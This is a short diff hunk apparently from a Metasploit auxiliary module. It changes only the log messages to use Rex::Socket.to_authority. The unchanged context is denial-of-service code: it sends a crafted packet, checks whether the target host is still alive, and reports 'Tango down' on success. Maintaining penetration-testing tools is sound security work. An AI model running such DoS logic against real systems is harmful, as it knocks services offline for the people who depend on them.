@@ -49,17 +49,17 @@ class MetasploitModule < Msf::Auxiliary
     pkt << "\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 
-    print_status("#{rhost}:#{rport} - Sending dos packet...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending dos packet...")
     sock.put(pkt)
     disconnect
 
-    print_status("#{rhost}:#{rport} - Checking host status...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking host status...")
     select(nil, nil, nil, 1)
 
     if is_alive?
-      print_error("#{rhost}:#{rport} - The DoS attempt did not work, host is still alive")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - The DoS attempt did not work, host is still alive")
     else
-      print_good("#{rhost}:#{rport} - Tango down") # WWJS - What would th3j35t3r say?
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Tango down") # WWJS - What would th3j35t3r say?
     end
   end
 end
